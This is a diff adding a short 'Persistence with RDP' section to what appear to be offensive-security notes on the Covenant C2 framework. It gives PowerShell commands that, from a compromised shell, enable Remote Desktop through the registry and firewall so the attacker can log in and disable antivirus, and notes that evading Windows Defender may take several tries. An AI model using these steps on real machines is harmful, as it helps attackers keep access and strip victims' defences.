@@ -35,6 +35,12 @@ Here we assume we have a shell with administrative privileges on the target
 
 ***Note: Windows Defender is really efficient in detecting this so you might have to try different things for AV evasion***
 
+## Persistence with RDP
+
+- With an initial shell on a machine with covenant
+- Enable Remote Desktop in our target: in the interact tab we can type this `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`
+- We could then connect to the target using rdp and disabling anti-virus this way
+- Disable Remote Desktop Commection: `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup "Remote Desktop"`
 
 ## Resources
 
